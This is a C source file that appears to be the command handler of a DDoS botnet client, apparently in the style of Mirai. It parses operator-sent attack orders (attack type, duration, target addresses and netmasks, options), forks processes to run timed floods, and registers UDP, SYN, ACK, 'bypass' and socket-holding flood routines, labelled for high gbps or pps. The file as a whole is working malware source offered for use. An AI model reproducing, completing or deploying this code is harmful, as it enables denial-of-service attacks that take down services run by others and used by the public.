#define _GNU_SOURCE

#include <stdint.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>

#include "headers/command.h"
#include "headers/includes.h"

static COMMAND_FUNC retrieve_command_func(uint8_t id)
{
	return command_list[id].func;
}

char *retrieve_opt_str(struct option *opt, uint8_t opt_len, uint8_t id, char *default_val)
{
    char *val;
    int x = 0;

    val = default_val;

    for(x = 0; x < opt_len; x++)
    {
        if(opt[x].id == id)
            val = opt[x].val;
    }

    return val;
}

uint16_t retrieve_opt_num(struct option *opt, uint8_t opt_len, uint8_t id, uint16_t default_val)
{
    uint16_t val = 0;
    int x = 0;

    val = default_val;

    for(x = 0; x < opt_len; x++)
    {
        if(opt[x].id == id)
            val = atoi(opt[x].val);
    }

    return val;
}

uint32_t retrieve_opt_ipv4(struct option *opt, uint8_t opt_len, uint8_t id, uint32_t default_val)
{
    uint32_t val = 0;
    int x = 0;

    val = default_val;

    for(x = 0; x < opt_len; x++)
    {
        if(opt[x].id == id)
            val = inet_addr(opt[x].val);
    }

    return val;
}

static void terminate_command(struct arguments *args)
{
    int ppid = -1;
    int i = 0;

    sleep(args->time);

    ppid = getppid();

    if(ppid > 1)
    {
        kill(ppid, SIGKILL);
    }

    if(args->targets)
    {
        free(args->targets);
    }

    if(!args->options)
    {
        exit(0);
    }

    for(i = 0; i < args->num_of_flags; i++)
    {
        free(args->options[i].val);
    }

    free(args->options);

    exit(0);
}

static void command_flood(uint8_t id, struct option *opt, uint8_t num_of_flags, struct target *target, uint8_t num_of_targets, uint16_t time)
{
    COMMAND_FUNC func;
    int pid = -1;
    int pid2 = -1;
    struct arguments args;

    func = retrieve_command_func(id);
    if(!func)
    {
        return;
    }

    // Build the command arguments
    args.targets = target;
    args.num_of_flags = num_of_flags;
    args.num_of_targets = num_of_targets;
    args.options = opt;
    args.time = time;

    pid = fork();

    if(pid == -1)
    {
        return;
    }

    if(pid != 0)
    {
        return;
    }

    pid2 = fork();

    if(pid2 == -1)
    {
        exit(1);
    }

    // Sleep inside the grandchild
    if(pid2 == 0)
    {
        terminate_command(&args);
    }

    // Call the command function here in the child
    func(&args);
}

void command_parse(char *buf, int buf_len)
{
    uint8_t id = 0;
    uint8_t num_of_targets = 0;
    struct option *opt = NULL;
    struct target *target = NULL;
    int x = 0;
    uint8_t num_of_flags = 0;
    uint16_t time = 0;

    // Read in the ID first
    id = *(uint8_t *)buf;
    buf += sizeof(uint8_t);
    buf_len -= sizeof(uint8_t);

    // Read in the time duration
    time = *(uint16_t *)buf;
    time = ntohs(time);
    buf += sizeof(uint16_t);
    buf_len -= sizeof(uint16_t);

    // Read in the number of targets
    num_of_targets = *(uint8_t *)buf;
    buf += sizeof(uint8_t);
    buf_len -= sizeof(uint8_t);

    // Allocate some space for the target+netmask
    target = (struct target *)calloc(num_of_targets, sizeof(struct target));
    if(!target)
        return;

    // Read in the target+netmask
    for(x = 0; x < num_of_targets; x++)
    {
        target[x].host = *(uint32_t *)buf;
        buf += sizeof(uint32_t);
        buf_len -= sizeof(uint32_t);
        target[x].netmask = *(uint8_t *)buf;
        buf += sizeof(uint16_t);
        buf_len -= sizeof(uint16_t);
    }

    // Read in the flag count
    num_of_flags = *(uint8_t *)buf;
    buf += sizeof(uint8_t);
    buf_len -= sizeof(uint8_t);

    if(num_of_flags == 0)
    {
        command_flood(id, opt, num_of_flags, target, num_of_targets, time);
        return;
    }

    // Allocate some space for the flag id+val
    opt = (struct option *)calloc(num_of_flags, sizeof(struct option));
    if(!opt)
    {
        free(target);
        return;
    }

    // Read in flag id+val
    for(x = 0; x < num_of_flags; x++)
    {
        uint16_t val_len = 0;

        opt[x].id = *(uint8_t *)buf;
        buf += sizeof(uint8_t);
        buf_len -= sizeof(uint8_t);

        val_len = *(uint16_t *)buf;
        val_len = ntohs(val_len);
        buf += sizeof(uint16_t);
        buf_len -= sizeof(uint16_t);

        opt[x].val = (char *)malloc(val_len + 1);
        memcpy(opt[x].val, buf, val_len);
        opt[x].val[val_len] = 0; // We shouldn't have to null terminate the buffer but just incase

        buf += val_len;
        buf_len -= val_len;

    }

	// Initialize the flood
	command_flood(id, opt, num_of_flags, target, num_of_targets, time);
	return;
}

static void load_command(uint8_t id, COMMAND_FUNC func)
{
    command_list[id].id = id;
    command_list[id].func = func;
	return;
}

void init_commands(void)
{
    load_command(FLOOD_UDPFLOOD, (COMMAND_FUNC)flood_udp_classic); // high gbps flood
	load_command(FLOOD_SYNFLOOD, (COMMAND_FUNC)flood_tcp_gsyn); // high gbps flood
	load_command(FLOOD_ACKFLOOD, (COMMAND_FUNC)flood_tcp_gack); // high gbps flood
	load_command(FLOOD_UDPPLAIN, (COMMAND_FUNC)flood_udp_plain); // high pps flood
	load_command(FLOOD_SYNPLAIN, (COMMAND_FUNC)flood_tcp_syn); // high pps flood
	load_command(FLOOD_ACKPLAIN, (COMMAND_FUNC)flood_tcp_ack); // high pps flood
	load_command(FLOOD_SYNACK, (COMMAND_FUNC)flood_tcp_sack); // high pps flood
	load_command(FLOOD_ACKPSH, (COMMAND_FUNC)flood_tcp_stomp); // high pps flood
	load_command(FLOOD_BYPASS, (COMMAND_FUNC)flood_udp_bypass); // bypass flood
    load_command(FLOOD_TCPSOCKET, (COMMAND_FUNC)flood_tcp_socket); // holds sockets open
    return;
}
